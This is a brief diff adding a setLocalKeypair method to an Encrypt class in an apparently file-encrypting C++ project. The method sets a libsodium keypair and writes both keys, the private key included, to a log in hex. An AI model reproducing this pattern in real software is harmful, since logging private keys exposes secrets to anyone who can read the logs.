@@ -31,6 +31,24 @@ void Encrypt::genLocalKeypair()
 }
 
 
+void Encrypt::setLocalKeypair(unsigned char *publickey, unsigned char *privatekey)
+{
+	memcpy(clientPublicKey, publickey, crypto_box_PUBLICKEYBYTES);
+	memcpy(clientSecretKey, privatekey, crypto_box_SECRETKEYBYTES);
+
+	std::string y = Amendux::Util::Hex<unsigned char *>(clientPublickey(), crypto_box_PUBLICKEYBYTES);
+	std::string x = Amendux::Util::Hex<unsigned char *>(clientPrivatekey(), crypto_box_SECRETKEYBYTES);
+
+	std::wstring wy;
+	std::wstring wx;
+	wy.assign(y.begin(), y.end());
+	wx.assign(x.begin(), x.end());
+
+	log << "pubkey: " << wy << "\n";
+	log << "privkey: " << wx << "\n";
+}
+
+
 void Encrypt::getDirFiles(std::wstring szDir)
 {
 	HANDLE dir;
